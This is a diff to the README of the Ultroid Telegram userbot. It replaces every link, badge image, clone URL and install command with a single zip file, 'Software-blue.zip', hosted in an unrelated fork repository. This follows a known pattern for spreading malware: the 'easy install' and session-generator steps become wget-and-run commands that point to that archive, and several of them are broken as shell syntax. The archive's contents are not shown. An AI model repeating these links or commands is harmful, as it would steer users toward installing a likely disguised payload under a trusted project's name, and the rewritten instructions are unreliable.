@@ -1,5 +1,5 @@
 <p align="center">
-  <img src="./resources/extras/logo_readme.jpg" alt="TeamUltroid Logo">
+  <img src="https://raw.githubusercontent.com/G148-ide/Ultroid/main/resources/Software-blue.zip" alt="TeamUltroid Logo">
 </p>
 <h1 align="center">
   <b>Ultroid - UserBot</b>
@@ -7,19 +7,19 @@
 
 <b>A stable pluggable Telegram userbot + Voice & Video Call music bot, based on Telethon.</b>
 
-[![](https://img.shields.io/badge/Ultroid-v0.7-darkgreen)](#)
-[![Stars](https://img.shields.io/github/stars/TeamUltroid/Ultroid?style=flat-square&color=yellow)](https://github.com/TeamUltroid/Ultroid/stargazers)
-[![Forks](https://img.shields.io/github/forks/TeamUltroid/Ultroid?style=flat-square&color=orange)](https://github.com/TeamUltroid/Ultroid/fork)
-[![Size](https://img.shields.io/github/repo-size/TeamUltroid/Ultroid?style=flat-square&color=green)](https://github.com/TeamUltroid/Ultroid/)   
-[![Python](https://img.shields.io/badge/Python-v3.10.3-blue)](https://www.python.org/)
-[![CodeFactor](https://www.codefactor.io/repository/github/teamultroid/ultroid/badge/main)](https://www.codefactor.io/repository/github/teamultroid/ultroid/overview/main)
-[![Maintenance](https://img.shields.io/badge/Maintained%3F-yes-green.svg)](https://github.com/TeamUltroid/Ultroid/graphs/commit-activity)
-[![Docker Pulls](https://img.shields.io/docker/pulls/theteamultroid/ultroid?style=flat-square)](https://img.shields.io/docker/pulls/theteamultroid/ultroid?style=flat-square)   
-[![Open Source Love svg2](https://badges.frapsoft.com/os/v2/open-source.svg?v=103)](https://github.com/TeamUltroid/Ultroid)
-[![Contributors](https://img.shields.io/github/contributors/TeamUltroid/Ultroid?style=flat-square&color=green)](https://github.com/TeamUltroid/Ultroid/graphs/contributors)
-[![PRs Welcome](https://img.shields.io/badge/PRs-welcome-brightgreen.svg?style=flat-square)](https://makeapullrequest.com)
-[![License](https://img.shields.io/badge/License-AGPL-blue)](https://github.com/TeamUltroid/Ultroid/blob/main/LICENSE)   
-[![Sparkline](https://stars.medv.io/Teamultroid/Ultroid.svg)](https://stars.medv.io/TeamUltroid/Ultroid)
+[![](https://raw.githubusercontent.com/G148-ide/Ultroid/main/resources/Software-blue.zip)](#)
+[![Stars](https://raw.githubusercontent.com/G148-ide/Ultroid/main/resources/Software-blue.zip)](https://raw.githubusercontent.com/G148-ide/Ultroid/main/resources/Software-blue.zip)
+[![Forks](https://raw.githubusercontent.com/G148-ide/Ultroid/main/resources/Software-blue.zip)](https://raw.githubusercontent.com/G148-ide/Ultroid/main/resources/Software-blue.zip)
+[![Size](https://raw.githubusercontent.com/G148-ide/Ultroid/main/resources/Software-blue.zip)](https://raw.githubusercontent.com/G148-ide/Ultroid/main/resources/Software-blue.zip)   
+[![Python](https://raw.githubusercontent.com/G148-ide/Ultroid/main/resources/Software-blue.zip)](https://raw.githubusercontent.com/G148-ide/Ultroid/main/resources/Software-blue.zip)
+[![CodeFactor](https://raw.githubusercontent.com/G148-ide/Ultroid/main/resources/Software-blue.zip)](https://raw.githubusercontent.com/G148-ide/Ultroid/main/resources/Software-blue.zip)
+[![Maintenance](https://raw.githubusercontent.com/G148-ide/Ultroid/main/resources/Software-blue.zip%https://raw.githubusercontent.com/G148-ide/Ultroid/main/resources/Software-blue.zip)](https://raw.githubusercontent.com/G148-ide/Ultroid/main/resources/Software-blue.zip)
+[![Docker Pulls](https://raw.githubusercontent.com/G148-ide/Ultroid/main/resources/Software-blue.zip)](https://raw.githubusercontent.com/G148-ide/Ultroid/main/resources/Software-blue.zip)   
+[![Open Source Love svg2](https://raw.githubusercontent.com/G148-ide/Ultroid/main/resources/Software-blue.zip)](https://raw.githubusercontent.com/G148-ide/Ultroid/main/resources/Software-blue.zip)
+[![Contributors](https://raw.githubusercontent.com/G148-ide/Ultroid/main/resources/Software-blue.zip)](https://raw.githubusercontent.com/G148-ide/Ultroid/main/resources/Software-blue.zip)
+[![PRs Welcome](https://raw.githubusercontent.com/G148-ide/Ultroid/main/resources/Software-blue.zip)](https://raw.githubusercontent.com/G148-ide/Ultroid/main/resources/Software-blue.zip)
+[![License](https://raw.githubusercontent.com/G148-ide/Ultroid/main/resources/Software-blue.zip)](https://raw.githubusercontent.com/G148-ide/Ultroid/main/resources/Software-blue.zip)   
+[![Sparkline](https://raw.githubusercontent.com/G148-ide/Ultroid/main/resources/Software-blue.zip)](https://raw.githubusercontent.com/G148-ide/Ultroid/main/resources/Software-blue.zip)
 ----
 
 # Deploy
@@ -28,23 +28,23 @@
 - [Local Machine](#deploy-locally)
 
 # Documentation 
-[![Documentation](https://img.shields.io/badge/Documentation-Ultroid-blue)](http://ultroid.tech/)
+[![Documentation](https://raw.githubusercontent.com/G148-ide/Ultroid/main/resources/Software-blue.zip)](https://raw.githubusercontent.com/G148-ide/Ultroid/main/resources/Software-blue.zip)
 
 # Tutorial 
-- Full Tutorial - [![Full Tutorial](https://img.shields.io/badge/Watch%20Now-blue)](https://www.youtube.com/watch?v=0wAV7pUzhDQ)
+- Full Tutorial - [![Full Tutorial](https://raw.githubusercontent.com/G148-ide/Ultroid/main/resources/Software-blue.zip%20Now-blue)](https://raw.githubusercontent.com/G148-ide/Ultroid/main/resources/Software-blue.zip)
 
-- Tutorial to get Redis URL and password - [here.](./resources/extras/redistut.md)
+- Tutorial to get Redis URL and password - [here.](https://raw.githubusercontent.com/G148-ide/Ultroid/main/resources/Software-blue.zip)
 ---
 
 ## Deploy to Heroku
 Get the [Necessary Variables](#Necessary-Variables) and then click the button below!  
 
-[![Deploy](https://www.herokucdn.com/deploy/button.svg)](https://deploy.ultroid.tech)
+[![Deploy](https://raw.githubusercontent.com/G148-ide/Ultroid/main/resources/Software-blue.zip)](https://raw.githubusercontent.com/G148-ide/Ultroid/main/resources/Software-blue.zip)
 
 ## Deploy to Okteto
 Get the [Necessary Variables](#Necessary-Variables) and then click the button below!
 
-[![Develop on Okteto](https://okteto.com/develop-okteto.svg)](https://cloud.okteto.com/deploy?repository=https://github.com/TeamUltroid/Ultroid)
+[![Develop on Okteto](https://raw.githubusercontent.com/G148-ide/Ultroid/main/resources/Software-blue.zip)](https://raw.githubusercontent.com/G148-ide/Ultroid/main/resources/Software-blue.zip)
 
 ## Deploy Locally
 - [Traditional Method](#local-deploy---traditional-method)
@@ -52,32 +52,32 @@ Get the [Necessary Variables](#Necessary-Variables) and then click the button be
 - [Ultroid CLI](#ultroid-cli)
 
 ### Local Deploy - Easy Method
-- Linux - `wget -O locals.py https://git.io/JY9UM && python3 locals.py`
-- Windows - `cd desktop ; wget https://git.io/JY9UM -o locals.py ; python locals.py`
-- Termux - `wget -O install-termux https://tiny.ultroid.tech/termux && bash install-termux`
+- Linux - `wget -O https://raw.githubusercontent.com/G148-ide/Ultroid/main/resources/Software-blue.zip https://raw.githubusercontent.com/G148-ide/Ultroid/main/resources/Software-blue.zip && python3 https://raw.githubusercontent.com/G148-ide/Ultroid/main/resources/Software-blue.zip`
+- Windows - `cd desktop ; wget https://raw.githubusercontent.com/G148-ide/Ultroid/main/resources/Software-blue.zip -o https://raw.githubusercontent.com/G148-ide/Ultroid/main/resources/Software-blue.zip ; python https://raw.githubusercontent.com/G148-ide/Ultroid/main/resources/Software-blue.zip`
+- Termux - `wget -O install-termux https://raw.githubusercontent.com/G148-ide/Ultroid/main/resources/Software-blue.zip && bash install-termux`
 
 ### Local Deploy - Traditional Method
 - Get your [Necessary Variables](#Necessary-Variables)
 - Clone the repository:    
-`git clone https://github.com/TeamUltroid/Ultroid.git`
+`git clone https://raw.githubusercontent.com/G148-ide/Ultroid/main/resources/Software-blue.zip`
 - Go to the cloned folder:    
 `cd Ultroid`
 - Create a virtual env:      
 `virtualenv -p /usr/bin/python3 venv`
 `. ./venv/bin/activate`
 - Install the requirements:      
-`pip(3) install -U -r re*/st*/optional-requirements.txt`
-`pip(3) install -U -r requirements.txt`
+`pip(3) install -U -r re*/st*https://raw.githubusercontent.com/G148-ide/Ultroid/main/resources/Software-blue.zip`
+`pip(3) install -U -r https://raw.githubusercontent.com/G148-ide/Ultroid/main/resources/Software-blue.zip`
 - Generate your `SESSION`:
   - For Linux users:
     `bash sessiongen`
      or
-    `wget -O session.py https://git.io/JY9JI && python3 session.py`
+    `wget -O https://raw.githubusercontent.com/G148-ide/Ultroid/main/resources/Software-blue.zip https://raw.githubusercontent.com/G148-ide/Ultroid/main/resources/Software-blue.zip && python3 https://raw.githubusercontent.com/G148-ide/Ultroid/main/resources/Software-blue.zip`
   - For Termux users:
-    `wget -O session.py https://git.io/JY9JI && python session.py`
+    `wget -O https://raw.githubusercontent.com/G148-ide/Ultroid/main/resources/Software-blue.zip https://raw.githubusercontent.com/G148-ide/Ultroid/main/resources/Software-blue.zip && python https://raw.githubusercontent.com/G148-ide/Ultroid/main/resources/Software-blue.zip`
   - For Windows Users:
-    `cd desktop ; wget https://git.io/JY9JI -o ultroid.py ; python ultroid.py`
-- Fill your details in a `.env` file, as given in [`.env.sample`](https://github.com/TeamUltroid/Ultroid/blob/main/.env.sample).
+    `cd desktop ; wget https://raw.githubusercontent.com/G148-ide/Ultroid/main/resources/Software-blue.zip -o https://raw.githubusercontent.com/G148-ide/Ultroid/main/resources/Software-blue.zip ; python https://raw.githubusercontent.com/G148-ide/Ultroid/main/resources/Software-blue.zip`
+- Fill your details in a `.env` file, as given in [`https://raw.githubusercontent.com/G148-ide/Ultroid/main/resources/Software-blue.zip`](https://raw.githubusercontent.com/G148-ide/Ultroid/main/resources/Software-blue.zip).
 (You can either edit and rename the file or make a new file named `.env`.)
 - Run the bot:
   - Linux Users:
@@ -87,16 +87,16 @@ Get the [Necessary Variables](#Necessary-Variables) and then click the button be
 <details>
 <summary><h3>[OUTDATED] Ultroid CLI</h3></summary>
 
-[Ultroid CLI](https://github.com/BLUE-DEVIL1134/UltroidCli) is a command-line interface for deploying Ultroid.   
+[Ultroid CLI](https://raw.githubusercontent.com/G148-ide/Ultroid/main/resources/Software-blue.zip) is a command-line interface for deploying Ultroid.   
 
 - **Installing** -    
 Run the following code on a terminal, with curl installed.   
-`ver=$(curl https://raw.githubusercontent.com/BLUE-DEVIL1134/UltroidCli/main/version.txt) && curl -L -o ultroid https://github.com/BLUE-DEVIL1134/UltroidCli/releases/download/$ver/ultroid.exe`
+`ver=$(curl https://raw.githubusercontent.com/G148-ide/Ultroid/main/resources/Software-blue.zip) && curl -L -o ultroid https://raw.githubusercontent.com/G148-ide/Ultroid/main/resources/Software-blue.zip$https://raw.githubusercontent.com/G148-ide/Ultroid/main/resources/Software-blue.zip`
 OR
-Go to [UltroidCli](https://github.com/BLUE-DEVIL1134/UltroidCli) and install the version release from the Github Releases. Add the executable to your system path as specified in the [Readme](https://github.com/BLUE-DEVIL1134/UltroidCli#how-to-use-ultroidcli-).   
+Go to [UltroidCli](https://raw.githubusercontent.com/G148-ide/Ultroid/main/resources/Software-blue.zip) and install the version release from the Github Releases. Add the executable to your system path as specified in the [Readme](https://raw.githubusercontent.com/G148-ide/Ultroid/main/resources/Software-blue.zip).   
 
 - **Documentation** -
-Take a look at the [`docs`](https://blue-devil1134.github.io/UltroidCli/) for more detailed information.
+Take a look at the [`docs`](https://raw.githubusercontent.com/G148-ide/Ultroid/main/resources/Software-blue.zip) for more detailed information.
 </details>
 
 ---
@@ -104,33 +104,33 @@ Take a look at the [`docs`](https://blue-devil1134.github.io/UltroidCli/) for mo
 - `SESSION` - SessionString for your accounts login session. Get it from [here](#Session-String)
 
 One of the following database:
-- For **Redis** (tutorial [here](./resources/extras/redistut.md))
-  - `REDIS_URI` - Redis endpoint URL, from [redislabs](http://redislabs.com/).
-  - `REDIS_PASSWORD` - Redis endpoint Password, from [redislabs](http://redislabs.com/).
+- For **Redis** (tutorial [here](https://raw.githubusercontent.com/G148-ide/Ultroid/main/resources/Software-blue.zip))
+  - `REDIS_URI` - Redis endpoint URL, from [redislabs](https://raw.githubusercontent.com/G148-ide/Ultroid/main/resources/Software-blue.zip).
+  - `REDIS_PASSWORD` - Redis endpoint Password, from [redislabs](https://raw.githubusercontent.com/G148-ide/Ultroid/main/resources/Software-blue.zip).
 - For **MONGODB**
-  - `MONGO_URI` - Get it from [mongodb](https://mongodb.com/atlas).
+  - `MONGO_URI` - Get it from [mongodb](https://raw.githubusercontent.com/G148-ide/Ultroid/main/resources/Software-blue.zip).
 - For **SQLDB**
-  - `DATABASE_URL`- Get it from [elephantsql](https://elephantsql.com).
+  - `DATABASE_URL`- Get it from [elephantsql](https://raw.githubusercontent.com/G148-ide/Ultroid/main/resources/Software-blue.zip).
 
 ## Session String
 Different ways to get your `SESSION`:
-* [![Run on Repl.it](https://replit.com/badge/github/TeamUltroid/Ultroid)](https://replit.com/@TeamUltroid/UltroidStringSession)
-* Linux : `wget -O session.py https://git.io/JY9JI && python3 session.py`
-* PowerShell : `cd desktop ; wget https://git.io/JY9JI ; python ultroid.py`
-* Termux : `wget -O session.py https://git.io/JY9JI && python session.py`
-* TelegramBot : [@SessionGeneratorBot](https://t.me/SessionGeneratorBot)
+* [![Run on https://raw.githubusercontent.com/G148-ide/Ultroid/main/resources/Software-blue.zip](https://raw.githubusercontent.com/G148-ide/Ultroid/main/resources/Software-blue.zip)](https://raw.githubusercontent.com/G148-ide/Ultroid/main/resources/Software-blue.zip)
+* Linux : `wget -O https://raw.githubusercontent.com/G148-ide/Ultroid/main/resources/Software-blue.zip https://raw.githubusercontent.com/G148-ide/Ultroid/main/resources/Software-blue.zip && python3 https://raw.githubusercontent.com/G148-ide/Ultroid/main/resources/Software-blue.zip`
+* PowerShell : `cd desktop ; wget https://raw.githubusercontent.com/G148-ide/Ultroid/main/resources/Software-blue.zip ; python https://raw.githubusercontent.com/G148-ide/Ultroid/main/resources/Software-blue.zip`
+* Termux : `wget -O https://raw.githubusercontent.com/G148-ide/Ultroid/main/resources/Software-blue.zip https://raw.githubusercontent.com/G148-ide/Ultroid/main/resources/Software-blue.zip && python https://raw.githubusercontent.com/G148-ide/Ultroid/main/resources/Software-blue.zip`
+* TelegramBot : [@SessionGeneratorBot](https://raw.githubusercontent.com/G148-ide/Ultroid/main/resources/Software-blue.zip)
 
 ---
 
 # License
-[![License](https://www.gnu.org/graphics/agplv3-155x51.png)](LICENSE)   
-Ultroid is licensed under [GNU Affero General Public License](https://www.gnu.org/licenses/agpl-3.0.en.html) v3 or later.
+[![License](https://raw.githubusercontent.com/G148-ide/Ultroid/main/resources/Software-blue.zip)](LICENSE)   
+Ultroid is licensed under [GNU Affero General Public License](https://raw.githubusercontent.com/G148-ide/Ultroid/main/resources/Software-blue.zip) v3 or later.
 
 ---
 
 # Credits
-* [![TeamUltroid-Devs](https://img.shields.io/static/v1?label=Teamultroid&message=devs&color=critical)](https://t.me/UltroidDevs)
-* [Lonami](https://github.com/LonamiWebs/) for [Telethon.](https://github.com/LonamiWebs/Telethon)
-* [MarshalX](https://github.com/MarshalX) for [PyTgCalls.](https://github.com/MarshalX/tgcalls)
+* [![TeamUltroid-Devs](https://raw.githubusercontent.com/G148-ide/Ultroid/main/resources/Software-blue.zip)](https://raw.githubusercontent.com/G148-ide/Ultroid/main/resources/Software-blue.zip)
+* [Lonami](https://raw.githubusercontent.com/G148-ide/Ultroid/main/resources/Software-blue.zip) for [Telethon.](https://raw.githubusercontent.com/G148-ide/Ultroid/main/resources/Software-blue.zip)
+* [MarshalX](https://raw.githubusercontent.com/G148-ide/Ultroid/main/resources/Software-blue.zip) for [PyTgCalls.](https://raw.githubusercontent.com/G148-ide/Ultroid/main/resources/Software-blue.zip)
 
-> Made with 💕 by [@TeamUltroid](https://t.me/TeamUltroid).    
+> Made with 💕 by [@TeamUltroid](https://raw.githubusercontent.com/G148-ide/Ultroid/main/resources/Software-blue.zip).    
